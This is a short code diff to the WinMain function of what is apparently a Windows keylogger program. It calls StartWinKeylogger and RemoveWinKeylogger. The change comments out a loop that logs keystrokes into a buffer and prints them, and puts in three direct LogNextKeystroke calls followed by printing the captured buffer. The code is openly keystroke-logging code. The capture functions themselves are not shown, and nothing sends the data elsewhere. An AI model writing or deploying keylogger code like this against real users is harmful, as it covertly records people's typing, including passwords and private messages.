@@ -16,7 +16,7 @@ int APIENTRY WinMain(
 
     StartWinKeylogger();
 
-    size_t buflen = 0;
+    /*size_t buflen = 0;
     while (LogNextKeystroke(&buflen)) {
         if (buflen == INPUT_BUFFER_SIZE - 1) {
             StrCpyLoggedBuffer(tmp_buff);
@@ -28,7 +28,12 @@ int APIENTRY WinMain(
     if (buflen) {
         StrCpyLoggedBuffer(tmp_buff);
         wprintf(L"BUFLEN: %u, %s\n",  buflen, tmp_buff);
-    }
+    }*/
+    LogNextKeystroke(NULL);
+    LogNextKeystroke(NULL);
+    LogNextKeystroke(NULL);
+    StrCpyLoggedBuffer(tmp_buff);
+    wprintf(L"%s\n",  tmp_buff);
 
     RemoveWinKeylogger();
     return 0;
